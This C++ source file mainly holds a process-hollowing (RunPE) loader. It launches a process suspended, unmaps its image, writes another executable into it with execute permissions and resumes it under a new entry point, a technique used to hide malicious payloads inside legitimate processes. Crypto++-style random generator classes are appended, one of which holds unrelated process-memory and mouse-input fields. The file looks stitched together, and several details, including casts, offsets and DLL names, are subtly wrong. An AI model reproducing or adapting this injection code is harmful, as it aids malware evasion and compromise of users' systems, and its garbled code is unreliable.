#include <Windows.h>
#include <TlHelp32.h>
#include <wchar.h>
typedef LONG(WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef BOOL(WINAPI * NtSetThreadContext)(HANDLE hThread, PCONTEXT lpContext);
typedef LPVOID(WINAPI * callVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef LPVOID(WINAPI * callVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef bool(WINAPI * callReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
typedef bool(WINAPI * callWriteProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
typedef HANDLE(WINAPI * callCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
typedef HANDLE(WINAPI * callProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef HANDLE(WINAPI * callProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);




void ExecFile(LPSTR szFilePath, LPVOID pFile)
{
	PIMAGE_DOS_HEADER IDH;
	PIMAGE_NT_HEADERS INH;
	PIMAGE_SECTION_HEADER ISH;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	PCONTEXT CTX;
	PDWORD dwImageBase;
	NtUnmapViewOfSection xNtUnmapViewOfSection;
	NtSetThreadContext xNtSetThreadContext;
	callReadProcessMemory xReadProcessMemory;
	callWriteProcessMemory xWriteProcessMemory;
	callVirtualAlloc xVirtualAlloc;
	callVirtualAllocEx xVirtualAllocEx;
	LPVOID pImageBase;
	int Count;
	IDH = PIMAGE_DOS_HEADER(pFile);
	if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
	{
		INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
		if (INH->Signature == IMAGE_NT_SIGNATURE)
		{
			RtlZeroMemory(&SI, sizeof(SI));
			RtlZeroMemory(&PI, sizeof(PI));

			if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
			{
				xVirtualAlloc = callVirtualAlloc(GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc"));
				xVirtualAllocEx = callVirtualAllocEx(GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAllocEx"));
				xReadProcessMemory = callReadProcessMemory(GetProcAddress(GetModuleHandleA("kernel32.dll"), "ReadProcessMemory"));
				xWriteProcessMemory = callReadProcessMemory(GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteProcessMemory"));
				CTX = PCONTEXT(xVirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
				CTX->ContextFlags = CONTEXT_FULL;
				if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
				{
					xReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);

					if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)
					{
						xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
						xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
					}

					pImageBase = xVirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);



					if (pImageBase)
					{
						xWriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
						for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++)
						{
							ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 167 + (Count * 40));
							xWriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
						}
						xWriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);
						CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;

						xNtSetThreadContext = NtSetThreadContext(GetProcAddress(GetModuleHandleA("d3d11.dll"), "NtSetContextThread"));
						xNtSetThreadContext(PI.hThread, LPCONTEXT(CTX));

						ResumeThread(PI.hThread);
					}



				}
			}
		}
	}
	VirtualFree(pFile, 0, MEM_RELEASE);
}


class LC_RNG : public RandomNumberGenerator
{
public:
	uint32_t    src_pid;
	uint64_t    src_addr;
	uint64_t    dst_addr;
	size_t        size;

	//function requests
	int request_key;

	//guarded regions
	uintptr_t allocation;

	//mouse
	long x;
	long y;
	unsigned short button_flags;

private:
	word32 seed;

	static const word32 m;
	static const word32 q;
	static const word16 a;
	static const word16 r;
};


class CRYPTOPP_DLL X917RNG : public RandomNumberGenerator, public NotCopyable
{
public:
	
	X917RNG(BlockTransformation *cipher, const byte *seed, const byte *deterministicTimeVector = NULLPTR);

	void GenerateIntoBufferedTransformation(BufferedTransformation &target, const std::string &channel, lword size);

private:
	member_ptr<BlockTransformation> m_cipher;
	const unsigned int m_size;  // S, blocksize of cipher
	SecByteBlock m_datetime;    // DT, buffer for enciphered timestamp
	SecByteBlock m_randseed, m_lastBlock, m_deterministicTimeVector;
};
